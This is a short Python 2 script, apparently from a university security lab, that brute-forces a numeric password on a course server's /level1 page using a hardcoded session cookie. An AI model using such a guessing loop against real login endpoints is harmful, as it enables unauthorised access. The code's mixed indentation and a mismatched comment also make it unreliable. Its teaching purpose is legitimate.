import urllib2 # A relatively easy to use HTTP library

#The server we want to attack (don't forget the port number if needs be!)
server = "http://cpe123.csc.calpoly.edu:443"
#You must login "manually" at least once to get your webpy_session token. Copy and paste it here:
token = "b25350ce985d2988de3f457f96196b923563f37e"


#For the numbers _ through _
for guess in range(1000):
	#Create an HTTP request to level0 of the server using 'guess' as a password guess
	req = urllib2.Request(server + "/level1?guess=" + str(guess))
	#Add the session cookie to the header
	req.add_header('Cookie', 'webpy_session_id=' + token)
	#Try to make the connection, if there an error (it doesn't return the HTTP 200 status code), catch it and print the error code
	try:
		response = urllib2.urlopen(req)
        #If we're here, then we probably got the right answer!
		print guess, response.getcode()
    	except urllib2.HTTPError as e:
        #If we're here, then we got a 400-level HTTP response code from the server, and our guess was wrong
			print guess, e.code
	else:
		quit()

